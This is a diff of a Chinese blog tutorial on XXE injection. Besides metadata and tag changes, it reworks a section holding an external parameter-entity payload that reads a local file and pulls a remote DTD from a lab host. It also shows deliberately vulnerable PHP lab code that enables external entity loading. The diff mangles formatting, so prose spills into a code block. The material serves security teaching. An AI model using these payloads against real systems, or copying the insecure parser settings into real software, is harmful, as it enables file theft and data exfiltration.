@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="xxe注入," />
+  <meta name="keywords" content="web,xxe," />
 
 
 
@@ -91,9 +91,10 @@
 <meta property="og:image" content="https://i.loli.net/2019/08/11/RgrH5uMoLDVkJws.png">
 <meta property="og:image" content="https://i.loli.net/2019/08/11/IvB56z1deUDpym7.png">
 <meta property="article:published_time" content="2019-08-11T08:52:31.000Z">
-<meta property="article:modified_time" content="2019-08-21T09:17:19.399Z">
+<meta property="article:modified_time" content="2021-01-03T12:39:21.473Z">
 <meta property="article:author" content="star">
-<meta property="article:tag" content="xxe注入">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="xxe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://i.loli.net/2019/08/11/aDtSVYlANCmpQnv.png">
 
@@ -319,19 +320,14 @@
 <p>需要注意的是被嵌套实体中的 % ,&lt; 等字符需要进行html实体编码，16或者8进制皆可。</p>
 </li>
 <li><p>参数实体，类似于</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">f1</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///C:/phpStudy/PHPTutorial/WWW/1.txt"</span>&gt;</span></span><br><span class="line"> 	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://10.211.55.10/eval.dtd"</span>&gt;</span></span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">f1</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///C:/phpStudy/PHPTutorial/WWW/1.txt"</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>参数实体的声明时的实体名前有%关键字，而引用时应用%实体名;来引用。</p>
+   <!ENTITY % remote SYSTEM "http://10.211.55.10/eval.dtd">
+<p>   %remote;<br>   %all;<br>   %send;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   参数实体的声明时的实体名前有%关键字，而引用时应用%实体名;来引用。</span><br><span class="line"></span><br><span class="line">&amp;emsp;&amp;emsp;xxe，xxe指的是外部实体注入，上面的实体定义不仅可以定义内部实体，也可以定义外部实体，引用远端的xml中定义的实体，并解析。并且可以根据不同的协议扩展为ssrf,任意命令执行，任意文件读取，ddos等等。</span><br><span class="line"></span><br><span class="line">## xxe注入演示</span><br><span class="line">### 实验环境交代 </span><br><span class="line">windows server 2008 r2 phpStudy php 5.3.29 libxml 2.7.8（libxml 2.9.4以及以上版本无效）</span><br><span class="line"></span><br><span class="line">### 实验代码</span><br><span class="line">+ reference: https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;xxe-lab 中的php_xxe</span><br><span class="line">  </span><br><span class="line">关键代码如下</span><br><span class="line">​&#96;&#96;&#96;php</span><br><span class="line">$USERNAME &#x3D; &#39;admin&#39;; &#x2F;&#x2F;账号</span><br><span class="line">$PASSWORD &#x3D; &#39;admin&#39;; &#x2F;&#x2F;密码</span><br><span class="line">$result &#x3D; null;</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader(false);</span><br><span class="line">$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);</span><br><span class="line"></span><br><span class="line">try &#123;</span><br><span class="line">	$dom &#x3D; new DOMDocument();</span><br><span class="line">	$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">	$creds &#x3D; simplexml_import_dom($dom);</span><br><span class="line"></span><br><span class="line">	$username &#x3D; $creds-&gt;username;</span><br><span class="line">	$password &#x3D; $creds-&gt;password;</span><br><span class="line"></span><br><span class="line">	if ($username &#x3D;&#x3D; $USERNAME &amp;&amp; $password &#x3D;&#x3D; $PASSWORD) &#123;</span><br><span class="line">		$result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;, 1, $username);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		$result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;, 0, $username);</span><br><span class="line">	&#125;</span><br><span class="line">&#125; catch (Exception $e) &#123;</span><br><span class="line">	$result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;, 3, $e-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(&#39;Content-Type: text&#x2F;html; charset&#x3D;utf-8&#39;);</span><br><span class="line">echo $result;</span><br></pre></td></tr></table></figure>
+
 </li>
 </ol>
-<p>&emsp;&emsp;xxe，xxe指的是外部实体注入，上面的实体定义不仅可以定义内部实体，也可以定义外部实体，引用远端的xml中定义的实体，并解析。并且可以根据不同的协议扩展为ssrf,任意命令执行，任意文件读取，ddos等等。</p>
-<h2 id="xxe注入演示"><a href="#xxe注入演示" class="headerlink" title="xxe注入演示"></a>xxe注入演示</h2><h3 id="实验环境交代"><a href="#实验环境交代" class="headerlink" title="实验环境交代"></a>实验环境交代</h3><p>windows server 2008 r2 phpStudy php 5.3.29 libxml 2.7.8（libxml 2.9.4以及以上版本无效）</p>
-<h3 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h3><ul>
-<li>reference: <a href="https://github.com/c0ny1/xxe-lab" target="_blank" rel="noopener">https://github.com/c0ny1/xxe-lab</a> 中的php_xxe</li>
-</ul>
-<p>关键代码如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$USERNAME = <span class="string">'admin'</span>; <span class="comment">//账号</span></span><br><span class="line">$PASSWORD = <span class="string">'admin'</span>; <span class="comment">//密码</span></span><br><span class="line">$result = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">	$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">	$creds = simplexml_import_dom($dom);</span><br><span class="line"></span><br><span class="line">	$username = $creds-&gt;username;</span><br><span class="line">	$password = $creds-&gt;password;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($username == $USERNAME &amp;&amp; $password == $PASSWORD) &#123;</span><br><span class="line">		$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>, <span class="number">1</span>, $username);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>, <span class="number">0</span>, $username);</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">	$result = sprintf(<span class="string">"&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;"</span>, <span class="number">3</span>, $e-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br></pre></td></tr></table></figure>
-
 <h3 id="回显注入"><a href="#回显注入" class="headerlink" title="回显注入"></a>回显注入</h3><p>&emsp;&emsp;先正常登录一次，抓包</p>
 <p><img src="https://i.loli.net/2019/08/11/aDtSVYlANCmpQnv.png" alt="image.png"></p>
 <p>&emsp;&emsp;可以看到这里username和password是以xml文档的形式提交的，这段文档将会被simplexml_import_dom方法解析为dom。这个过程中因为load_XML设置了LIBXML_DTDLOAD和LIBXML_NOENT，所以可以加载解析外部实体，并且会回显username。我们改包试一下。</p>
@@ -364,7 +360,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/xxe%E6%B3%A8%E5%85%A5/" rel="tag"># xxe注入</a>
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/xxe/" rel="tag"># xxe</a>
           
         </div>
       
@@ -466,7 +464,7 @@
               
                 <a href="/archives/%20%7C%7C%20archive">
               
-                  <span class="site-state-item-count">35</span>
+                  <span class="site-state-item-count">36</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -479,7 +477,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-count">30</span>
                   <span class="site-state-item-name">tags</span>
                 
               </div>
@@ -512,7 +510,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xml语言和xxe介绍"><span class="nav-number">2.</span> <span class="nav-text">xml语言和xxe介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xxe注入演示"><span class="nav-number">3.</span> <span class="nav-text">xxe注入演示</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#实验环境交代"><span class="nav-number">3.1.</span> <span class="nav-text">实验环境交代</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实验代码"><span class="nav-number">3.2.</span> <span class="nav-text">实验代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#回显注入"><span class="nav-number">3.3.</span> <span class="nav-text">回显注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#非回显注入"><span class="nav-number">3.4.</span> <span class="nav-text">非回显注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#报错注入"><span class="nav-number">3.5.</span> <span class="nav-text">报错注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞验证流程"><span class="nav-number">4.</span> <span class="nav-text">漏洞验证流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xml语言和xxe介绍"><span class="nav-number">2.</span> <span class="nav-text">xml语言和xxe介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#回显注入"><span class="nav-number">2.1.</span> <span class="nav-text">回显注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#非回显注入"><span class="nav-number">2.2.</span> <span class="nav-text">非回显注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#报错注入"><span class="nav-number">2.3.</span> <span class="nav-text">报错注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞验证流程"><span class="nav-number">3.</span> <span class="nav-text">漏洞验证流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
             
 
           </div>
@@ -532,7 +530,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
